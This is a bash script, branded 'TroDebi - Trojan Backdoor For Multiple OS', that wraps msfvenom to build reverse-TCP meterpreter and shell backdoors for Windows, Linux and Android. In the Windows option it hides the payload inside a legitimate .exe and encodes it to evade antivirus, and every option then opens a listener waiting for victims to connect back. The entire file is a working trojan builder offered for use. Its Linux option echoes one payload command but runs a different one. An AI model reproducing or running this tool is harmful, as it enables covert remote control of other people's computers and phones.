#!/bin/bash

echo -e "\e[1;31m___________            ________        ___.   .__ \e[0m";
echo -e "\e[1;31m\__    ___/______  ____\______ \   ____\_ |__ |__|\e[0m";
echo -e "\e[1;31m  |    |  \_  __ \/  _ \|    |  \_/ __ \| __ \|  |\e[0m";
echo -e "\e[1;31m  |    |   |  | \(  <_> )    \    \   ___/| \_\\  |\e[0m";
echo -e "\e[1;31m  |____|   |__|   \____/_______  /\___  >___  /__|\e[0m";
echo -e "\e[1;31m                               \/     \/    \/    \n\e[0m";

echo -e "\e[1;32m \tTroDebi  -  Trojan Backdoor For Multiple OS   \e[0m"
echo -e "\e[1;32m \tVersion  -  freeware \e[0m"
echo -e "\e[1;32m \tWrite by -  1411_Ketan.D & 1442_Sayantan.M                                         \n\n   \e[0m"

echo -e "\e[1;35m 1.Payload For windows \e[0m"
echo -e "\e[1;34m 2.Payload For Linux \e[0m"
echo -e "\e[1;33m 3.Payload For Android \e[0m"
echo -e "\e[1;36m q.QUIT \e[0m"

read -p "Enter your Choice[1-3]:" option
echo " Your choice is $option."

case $option in
	1)
		echo -e "\e[1;35m****************** Mfsvemon for Windows ******************\e[0m"
		read -p " Enter the architure (use default x86 else x64):" arch
		read -p " Enter the platfrom (default windows):" platform
		read -p " Enter .exe file path or copy the file in script dir for use:" path
		read -p " Enter the your local system ip(lhost OR 0.0.0.0):" host
		read -p " Enter the your local port (your machine):" port
		read -p " Enter the file_name and path you want your file on:" filepath

################################################ Command for Running and making backdoor trojan payload ################################################

		echo -e "\e[1;34m msfvenom -a $arch --platform $platform -x $path -k -p windows/meterpreter/reverse_tcp LHOST=$host LPORT=$port -i 3 -b \x00 -e x86/shikata_ga_nai -f exe -o $filepath \e[0m"

		msfvenom -a $arch --platform $platform -x $path -k -p windows/meterpreter/reverse_tcp LHOST=$host LPORT=$port -i 3 -b "\x00" -e x86/shikata_ga_nai -f exe -o $filepath

        	echo -e "\e[1;31m Your Payload is genrated !!!!!!! \e[0m"
############################################### Command for Running listener for backdoor ###############################################################

		a="yes"
		read -p "Want to start listener{msfconsole} yes/no:" wish

		while [ $a = $wish ]
		do
			xterm -T "☣ OPENING MSFconsole" -geometry 100x50 -e msfconsole -x "use exploit/multi/handler;set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $host; set LPORT $port; run; exit -y"
		    	break
		done
		;;

	2)
		echo -e "\e[1;35m********************* Mfsvemon for Linux ************************\e[0m"
		read -p " Enter the architure (use default x86 or x64):" arch
		read -p " Enter the platfrom (select linux):" platform
		read -p " Enter the your system ip(lhost OR 0.0.0.0):" host
		read -p " Enter the your port (lport):" port
		read -p " Enter the file_name and path you want your file on(.bsh or .sh):" filepath

############################################## Command for Running and making backdoor trojan payload ################################################### 
		echo -e "\e[1;32m msfvenom -a $arch --platform $platform -p linux/x86/meterpreter/reverse_tcp LHOST=$host LPORT=$port -b "\x00" -f python -o $filepath \e[0m"
		msfvenom -a $arch --platform $platform -p linux/x86/shell/reverse_tcp LHOST=$host LPORT=$port -b "\x00" -f elf -o $filepath

		echo -e "\e[1;31m Your Payload is genrated !!!!!!! \e[0m"
############################################## Command for Running listener for backdoor #################################################################
        	a="yes"
		read -p "Want to start listener{msfconsole} yes/no:" wish

		while [ $a = $wish ]
		do
        		xterm -T "☣ OPENING MSFconsole ☣" -geometry 100x50 -e msfconsole -x "use exploit/multi/handler;set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST $host; set LPORT $port; exploit; exit -y"
        		break
		done
		;;

	3)
		echo -e "\e[1;35m******************** Mfsvemon for Android *********************\e[0m"
		echo " architure default dalvik for android"
		echo " platfrom android use by default"
		read -p " Enter the your local system ip(lhost OR 0.0.0.0):" host
		read -p " Enter the your local port (lport):" port
		read -p " Enter the file_name and path you want your file on:" filepath

########################################### Command for Running and making backdoor trojan payload#####################################################         
		echo -e "\e[1;32m msfvenom -p android/meterpreter/reverse_tcp LHOST=$host LPORT=$port -o $filepath \e[0m"
		msfvenom $path -p android/meterpreter/reverse_tcp LHOST=$host LPORT=$port -o $filepath 


        	echo -e "\e[1;31m Your Payload is genrated !!!!!!! \e[0m"

###################################### Command for Running listener for backdoor#######################################################################      

		a="yes"
		read -p "Want to start listener{msfconsole} yes/no:" wish

		while [ $a = $wish ]
		do
			xterm -T "☣ OPENING MSFconsole ☣" -geometry 100x50 -e msfconsole -x "use exploit/multi/handler;set PAYLOAD android/meterpreter/reverse_tcp; set LHOST $host; set LPORT $port; run; exit -y"
			break
        	done
        	;;
	q)	echo -e "\e[1;31m Goodbye !!!! \e[0m"
		exit 0
		;;
	*)
		echo "Invalid Choice please start again"
		;;
esac
